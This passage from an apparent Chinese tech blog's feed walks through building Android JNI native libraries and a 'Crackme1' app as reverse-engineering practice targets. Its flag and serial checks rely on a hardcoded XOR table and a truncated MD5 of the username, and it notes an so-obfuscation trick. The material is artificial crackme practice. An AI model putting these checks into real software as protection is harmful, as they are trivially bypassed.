class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">"MissingConstraints"</span> /&gt;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>MainActivity结构<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</div><div class="line"><span class="keyword">import</span> android.os.Bundle;</div><div class="line"><span class="keyword">import</span> android.view.View;</div><div class="line"><span class="keyword">import</span> android.widget.Button;</div><div class="line"><span class="keyword">import</span> android.widget.EditText;</div><div class="line"><span class="keyword">import</span> android.widget.Toast;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        <span class="keyword">final</span> EditText sstr = (EditText) findViewById(R.id.input_flag);</div><div class="line">        <span class="keyword">final</span> Button ok = (Button) findViewById(R.id.input_ok);</div><div class="line"></div><div class="line">        ok.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">                String st = sstr.getText().toString().trim();</div><div class="line"></div><div class="line">                String res = check.Check(st);</div><div class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, res, Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>运行就可以得到调用native方法的apk了。</p><h1 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h1><p>1.源码改动少，只需要添加JNI_Onload函数<br>2.无需加解密so，就可以实现混淆so中的JNI函数<br>3.后续可以添加so加解密，使破解难度更大</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;要逆向，必须会正向编写。so文件混淆——jni_load()&lt;br&gt;
    
    </summary>
    
      <category term="android" scheme="http://yoursite.com/categories/android/"/>
    
    
  </entry>
  
  <entry>
    <title>JNI</title>
    <link href="http://yoursite.com/2018/07/02/android_8_jni/"/>
    <id>http://yoursite.com/2018/07/02/android_8_jni/</id>
    <published>2018-07-02T13:49:18.000Z</published>
    <updated>2018-07-10T10:50:26.207Z</updated>
    
    <content type="html"><![CDATA[<p>要逆向，必须会正向编写。第一个.so文件的编写（adnroid studio环境）<br><a id="more"></a></p><h1 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h1><p><a href="https://www.jianshu.com/p/5484c2a44061" target="_blank" rel="external">参考</a><br>我这里直接安装adnroid studio，环境就搭好了。</p><h1 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h1><h2 id="创建check"><a href="#创建check" class="headerlink" title="创建check"></a>创建check</h2><p>在MainActivity同一级创建一个check.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.example.ese.jni;</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">check</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> String <span class="title">Check</span><span class="params">(String sstr)</span></span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>工具栏Build-&gt;Make Project（ctrl+f9）。在main的下一层（java层）创建jni目录<br>android在终端<br>Terminal&gt;&gt;cd app/src/main/java<br>Terminal&gt;&gt;javah -jni com.example.ese.jni.check<br>(这时会产生一个com.example.ese.jni.check.h文件)<br>Terminal&gt;&gt;cd ..<br>Terminal&gt;&gt;cd jni<br>(将上面的com.example.ese.jni.check.h拖入jni目录中)</p><p>在jni目录下新建一个check.c文件<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;com_example_ese_jni_check.h&gt;</span></span></div><div class="line"><span class="keyword">int</span> enc_f[]=&#123;<span class="number">0xc2</span>, <span class="number">0xfc</span>, <span class="number">0xce</span>, <span class="number">0x93</span>, <span class="number">0xd0</span>, <span class="number">0xa2</span>, <span class="number">0xd4</span>, <span class="number">0xbb</span>, <span class="number">0xe4</span>, <span class="number">0xbf</span>, <span class="number">0x8b</span>&#125;;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_14025xor</span><span class="params">(<span class="keyword">char</span> *input)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> llen = <span class="built_in">strlen</span>(input);</div><div class="line">    <span class="keyword">for</span>(;i&lt;llen;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>((input[i]^<span class="number">0xbb</span>)!=enc_f[i])</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">             <span class="keyword">if</span>((input[i]^<span class="number">0xcc</span>)!=enc_f[i])</div><div class="line">             &#123;</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">             &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//方法名是com_example_ese_jni_check+方法Check</span></div><div class="line"><span class="function">JNIEXPORT jstring JNICALL <span class="title">Java_com_example_ese_jni_check_Check</span><span class="params">(JNIEnv *env, jclass jz,jstring str1)</span></span></div><div class="line"><span class="function"></span>&#123;       </div><div class="line"></div><div class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *str = (*env)-&gt;GetStringUTFChars(env, str1, <span class="literal">NULL</span>);</div><div class="line">        <span class="keyword">if</span>(str == <span class="literal">NULL</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> key = sub_14025xor(str);</div><div class="line"></div><div class="line">        <span class="keyword">char</span>* tmpstr = <span class="string">"succeeded"</span>;</div><div class="line">        <span class="keyword">if</span>(key)</div><div class="line">        &#123;</div><div class="line">                jstring rtstr = (*env)-&gt;NewStringUTF(env, tmpstr);</div><div class="line">                <span class="keyword">return</span> rtstr;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">                tmpstr = <span class="string">"failed!!"</span>;</div><div class="line">                jstring rtstr = (*env)-&gt;NewStringUTF(env, tmpstr);</div><div class="line">                <span class="keyword">return</span> rtstr;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>在jni目录下新建一个Android.mk文件和Application.mk文件<br>Android.mk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := check</div><div class="line">LOCAL_SRC_FILES := check.c</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure></p><p>Application.mk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">APP_ABI := all</div></pre></td></tr></table></figure></p><p>现在terminal在jni目录下<br>terminal&gt;&gt;ndk-build</p><p>这时候会生成libcheck.so文件在libs(jni同级目录)</p><h1 id="调用so"><a href="#调用so" class="headerlink" title="调用so"></a>调用so</h1><p>在方法Check添加调用库check<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">check</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">static</span> &#123;</div><div class="line">        System.loadLibrary(<span class="string">"check"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> String <span class="title">Check</span><span class="params">(String sstr)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>在app目录下的build.gradle中添加<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">android &#123;</div><div class="line">       ......</div><div class="line">    sourceSets &#123;</div><div class="line">        main() &#123;</div><div class="line">            jniLibs.srcDirs = ['src/main/libs']</div><div class="line">            jni.srcDirs = [] <span class="comment">//屏蔽掉默认的jni编译生成过程</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这时一个简单的输入结构:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">activity_main.xml</div><div class="line">&#123;</div><div class="line"></div><div class="line">    .....</div><div class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/input_flag"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"80dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginRight</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"100dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:ems</span>=<span class="string">"10"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:inputType</span>=<span class="string">"textPersonName"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"input your flag"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toTopOf</span>=<span class="string">"@+id/button"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">"UnknownId"</span> /&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">Button</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/input_ok"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"102dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"45dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"276dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginRight</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"确认"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">"0.458"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">"MissingConstraints"</span> /&gt;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>MainActivity结构<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</div><div class="line"><span class="keyword">import</span> android.os.Bundle;</div><div class="line"><span class="keyword">import</span> android.view.View;</div><div class="line"><span class="keyword">import</span> android.widget.Button;</div><div class="line"><span class="keyword">import</span> android.widget.EditText;</div><div class="line"><span class="keyword">import</span> android.widget.Toast;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        <span class="keyword">final</span> EditText sstr = (EditText) findViewById(R.id.input_flag);</div><div class="line">        <span class="keyword">final</span> Button ok = (Button) findViewById(R.id.input_ok);</div><div class="line"></div><div class="line">        ok.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">                String st = sstr.getText().toString().trim();</div><div class="line"></div><div class="line">                String res = check.Check(st);</div><div class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, res, Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>运行就可以得到调用native方法的apk了。<br>apk生成路径:C:\Users\Administrator\AndroidStudioProjects\jni\app\build\outputs\apk\debug</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;要逆向，必须会正向编写。第一个.so文件的编写（adnroid studio环境）&lt;br&gt;
    
    </summary>
    
      <category term="android" scheme="http://yoursite.com/categories/android/"/>
    
    
  </entry>
  
  <entry>
    <title>Crackme1</title>
    <link href="http://yoursite.com/2018/06/22/android_7_apk_crackme/"/>
    <id>http://yoursite.com/2018/06/22/android_7_apk_crackme/</id>
    <published>2018-06-22T00:49:18.000Z</published>
    <updated>2018-07-10T10:40:10.218Z</updated>
    
    <content type="html"><![CDATA[<p>Android stdio 第一个程序 Crackme1<br><a id="more"></a><br>安装Android Studio。</p><h1 id="Crackme1"><a href="#Crackme1" class="headerlink" title="Crackme1"></a>Crackme1</h1><h2 id="创建app"><a href="#创建app" class="headerlink" title="创建app"></a>创建app</h2><p>File-&gt;New Project[Application name: Crackme1,Project Location : ..;Company domain: ese.example.com]-&gt;Phone and Tablet[API 19…]-&gt;Empty Activity-&gt;Finish[默认就好]</p><h2 id="布局框架"><a href="#布局框架" class="headerlink" title="布局框架"></a>布局框架</h2><p>activit_main_xml编辑如下:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ScrollView</span></span></div><div class="line"><span class="tag">      <span class="attr">android:layout_width</span>=<span class="string">"368dp"</span></span></div><div class="line"><span class="tag">      <span class="attr">android:layout_height</span>=<span class="string">"495dp"</span></span></div><div class="line"><span class="tag">      <span class="attr">tools:layout_editor_absoluteY</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">      <span class="attr">tools:layout_editor_absoluteX</span>=<span class="string">"8dp"</span>&gt;</span></div><div class="line"></div><div class="line">      <span class="tag">&lt;<span class="name">RelativeLayout</span></span></div><div class="line"><span class="tag">          <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">          <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>&gt;</span></div><div class="line"></div><div class="line">          <span class="tag">&lt;<span class="name">EditText</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">"400dp"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">"60dp"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:inputType</span>=<span class="string">"textPersonName"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:id</span>=<span class="string">"@+id/login_edit_account"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:drawableLeft</span>=<span class="string">"@android:drawable/ic_menu_myplaces"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:hint</span>=<span class="string">"请输入您的用户名"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_marginTop</span>=<span class="string">"20dp"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_below</span>=<span class="string">"@+id/logo"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_alignParentLeft</span>=<span class="string">"true"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_alignParentStart</span>=<span class="string">"true"</span> /&gt;</span></div><div class="line"></div><div class="line">          <span class="tag">&lt;<span class="name">EditText</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">"400dp"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">"60dp"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:inputType</span>=<span class="string">"textPassword"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:ems</span>=<span class="string">"10"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:id</span>=<span class="string">"@+id/login_edit_pwd"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:drawableLeft</span>=<span class="string">"@android:drawable/ic_lock_idle_lock"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:hint</span>=<span class="string">"请输入您的密码"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_below</span>=<span class="string">"@+id/login_edit_account"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_alignParentLeft</span>=<span class="string">"true"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_alignParentStart</span>=<span class="string">"true"</span> /&gt;</span></div><div class="line"></div><div class="line">          <span class="tag">&lt;<span class="name">Button</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">"fill_parent"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:text</span>=<span class="string">"登录"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:id</span>=<span class="string">"@+id/login_btn_login"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:onClick</span>=<span class="string">"finish_login"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:background</span>=<span class="string">"#545bcb"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:textSize</span>=<span class="string">"20dp"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:textColor</span>=<span class="string">"#ffffff"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_below</span>=<span class="string">"@+id/login_edit_pwd"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_alignParentLeft</span>=<span class="string">"true"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_alignParentStart</span>=<span class="string">"true"</span></span></div><div class="line"><span class="tag">              <span class="attr">android:layout_marginTop</span>=<span class="string">"52dp"</span> /&gt;</span></div><div class="line">          </div><div class="line">      <span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></div></pre></td></tr></table></figure></p><p>如图<br><img src="https://i.imgur.com/NwWZMaz.png" alt=""><br>填加需要的字符res-&gt;values-&gt;strings.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"app_name"</span>&gt;</span>Crackme1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>success！！！！<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"fail"</span>&gt;</span>Fail！！！！<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></div></pre></td></tr></table></figure></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>接着编写MainActivity类的代码，添加一个checkSN()方法如下:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">checkSN</span><span class="params">(String userName, String sn)</span> </span>&#123; <span class="comment">//确认验证,len(sn)==16</span></div><div class="line"></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">if</span> ((userName == <span class="keyword">null</span>) || (userName.length() == <span class="number">0</span>))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        <span class="keyword">if</span> ((sn == <span class="keyword">null</span>) || (sn.length() != <span class="number">16</span>))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        MessageDigest digest = <span class="keyword">null</span>;</div><div class="line">        digest = MessageDigest.getInstance(<span class="string">"MD5"</span>);</div><div class="line">        digest.reset();</div><div class="line">        digest.update(userName.getBytes());</div><div class="line">        <span class="keyword">byte</span>[] bytes = digest.digest();     <span class="comment">//采用MD5对用户名进行Hash</span></div><div class="line"></div><div class="line"></div><div class="line">        String hexstr = toHexString(bytes, <span class="string">""</span>); <span class="comment">//将计算结果转化成字符串</span></div><div class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; hexstr.length(); i += <span class="number">2</span>) &#123;</div><div class="line">            sb.append(hexstr.charAt(i));</div><div class="line">        &#125;</div><div class="line">        String userSN = sb.toString(); <span class="comment">//计算出的SN</span></div><div class="line">        <span class="comment">//Log.d("len(sn)==16", "-------sn==16----------------------------------");</span></div><div class="line">        <span class="comment">//Log.d("name_md5_hex", hexstr);</span></div><div class="line">        <span class="comment">//Log.d("sn", userSN);</span></div><div class="line">        <span class="keyword">if</span> (!userSN.equalsIgnoreCase(sn))   <span class="comment">//比较注册码是否正确</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">        e.printStackTrace();</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">toHexString</span><span class="params">(<span class="keyword">byte</span>[] bytes, String separator)</span> </span>&#123; <span class="comment">//转为十六进制</span></div><div class="line">    StringBuilder hexString = <span class="keyword">new</span> StringBuilder();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytes) &#123;</div><div class="line">        String hex = Integer.toHexString(<span class="number">0xFF</span> &amp; b);</div><div class="line">        <span class="keyword">if</span>(hex.length() == <span class="number">1</span>)&#123;</div><div class="line">            hexString.append(<span class="string">'0'</span>);</div><div class="line">        &#125;</div><div class="line">        